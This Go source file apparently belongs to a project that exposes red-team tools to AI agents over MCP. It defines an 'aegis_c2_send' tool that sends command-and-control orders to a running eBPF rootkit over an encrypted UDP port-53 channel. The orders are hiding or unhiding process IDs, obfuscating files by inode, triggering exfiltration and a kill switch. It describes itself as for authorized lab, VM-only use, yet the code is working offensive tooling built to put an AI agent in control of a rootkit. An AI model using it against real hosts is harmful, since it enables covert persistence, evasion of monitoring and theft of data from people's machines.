package aegis

import (
	"context"
	"encoding/json"
	"fmt"
	"net/netip"
	"strconv"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// c2Binary is the aegis-c2 sender CLI built from the Aegis-Shadow workspace.
const c2Binary = "aegis-c2"

// C2 commands accepted by the running offense rootkit (dispatch_c2_command).
var c2Commands = map[string]argRule{
	"hide-pid":       {requiresArg: true, maxArg: 4294967295},
	"unhide-pid":     {requiresArg: true, maxArg: 4294967295},
	"obfuscate-file": {requiresArg: true, maxArg: 4294967295}, // inode, u32 wire field
	"exfil":          {requiresArg: false},
	"kill-switch":    {requiresArg: false},
}

type argRule struct {
	requiresArg bool
	maxArg      int64
}

// C2SendTool sends a single command to a running Aegis-Shadow offense
// rootkit over its encrypted C2 channel (UDP, ChaCha8 + keyed HMAC).
type C2SendTool struct {
	exec executor.Executor
}

// NewC2Send creates the C2 command sender tool.
func NewC2Send(exec executor.Executor) *C2SendTool {
	return &C2SendTool{exec: exec}
}

func (t *C2SendTool) Name() string { return "aegis_c2_send" }

func (t *C2SendTool) Description() string {
	return "Send a single command to a RUNNING Aegis-Shadow offense rootkit over its encrypted C2 channel " +
		"(UDP:53, ChaCha8 keystream + keyed HMAC, fire-and-forget — the rootkit gives no acknowledgement). " +
		"Commands: hide-pid/unhide-pid (arg: pid), obfuscate-file (arg: inode), exfil (trigger exfiltration), " +
		"kill-switch (terminate the rootkit). Wraps the aegis-c2 sender CLI, which shares the exact receiver " +
		"crypto from the Aegis-Shadow common crate. The target must be an IPv4 host running the rootkit " +
		"(the XDP receiver only accepts IPv4). Wraps Aegis-Shadow (Linux eBPF security research platform, " +
		"educational/VM-only) for authorized lab use only."
}

func (t *C2SendTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"target": {
				"type": "string",
				"description": "IPv4 address of the host running the offense rootkit"
			},
			"command": {
				"type": "string",
				"enum": ["hide-pid", "unhide-pid", "obfuscate-file", "exfil", "kill-switch"],
				"description": "C2 command to send"
			},
			"arg": {
				"type": "string",
				"description": "Command argument: pid for hide-pid/unhide-pid, inode for obfuscate-file; must be empty for exfil and kill-switch"
			},
			"port": {
				"type": "integer",
				"description": "C2 UDP port (default 53; the stock rootkit only accepts 53)",
				"minimum": 1,
				"maximum": 65535
			},
			"key": {
				"type": "string",
				"description": "Optional 64-hex-character ChaCha20 key override (only useful against custom rootkit builds; the stock rootkit uses compile-time keys)"
			}
		},
		"required": ["target", "command"]
	}`)
}

type c2SendInput struct {
	Target  string `json:"target"`
	Command string `json:"command"`
	Arg     string `json:"arg"`
	Port    int    `json:"port"`
	Key     string `json:"key"`
}

func (t *C2SendTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var in c2SendInput
	if err := json.Unmarshal(params, &in); err != nil {
		return errorResult("invalid parameters: " + err.Error()), nil
	}
	if strings.TrimSpace(in.Target) == "" {
		return errorResult("target is required"), nil
	}
	// The XDP receiver only parses IPv4 ethertype frames.
	addr, err := netip.ParseAddr(in.Target)
	if err != nil || !addr.Is4() {
		return errorResult("target must be an IPv4 address (the C2 XDP receiver only accepts IPv4)"), nil
	}

	rule, ok := c2Commands[in.Command]
	if !ok {
		return errorResult("command must be one of: hide-pid, unhide-pid, obfuscate-file, exfil, kill-switch"), nil
	}

	arg := strings.TrimSpace(in.Arg)
	if rule.requiresArg {
		if arg == "" {
			return errorResult(fmt.Sprintf("command %s requires arg (pid or inode)", in.Command)), nil
		}
		value, err := strconv.ParseInt(arg, 10, 64)
		if err != nil || value <= 0 || value > rule.maxArg {
			return errorResult(fmt.Sprintf("arg must be a positive integer up to %d", rule.maxArg)), nil
		}
	} else if arg != "" {
		return errorResult(fmt.Sprintf("command %s takes no arg", in.Command)), nil
	}

	port := 53
	if in.Port != 0 {
		if in.Port < 1 || in.Port > 65535 {
			return errorResult("port must be between 1 and 65535"), nil
		}
		port = in.Port
	}

	if in.Key != "" && !isHexKey(in.Key) {
		return errorResult("key must be exactly 64 hexadecimal characters"), nil
	}

	args := []string{"--target", in.Target, "--command", in.Command, "--port", strconv.Itoa(port)}
	if arg != "" {
		args = append(args, "--arg", arg)
	}
	if in.Key != "" {
		args = append(args, "--key", in.Key)
	}

	result, err := t.exec.Run(ctx, c2Binary, args...)
	if err != nil {
		// aegis-c2 exits non-zero on validation or socket errors.
		stdout := ""
		if result != nil {
			stdout = string(result.Stdout)
		}
		return errorResult(fmt.Sprintf("aegis-c2 failed: %v\n%s", err, stdout)), nil
	}

	var sb strings.Builder
	sb.WriteString("## Aegis-Shadow C2 Command Sent\n\n")
	sb.WriteString("```json\n" + string(result.Stdout) + "\n```\n\n")
	sb.WriteString("Notes:\n\n")
	sb.WriteString("- The channel is fire-and-forget: the rootkit applies the command without acknowledgement\n")
	sb.WriteString("- `aegis_offense_status` on the operator host shows whether the loader is still running (kill-switch stops it)\n")

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

func isHexKey(s string) bool {
	if len(s) != 64 {
		return false
	}
	for _, r := range s {
		switch {
		case r >= '0' && r <= '9', r >= 'a' && r <= 'f', r >= 'A' && r <= 'F':
		default:
			return false
		}
	}
	return true
}
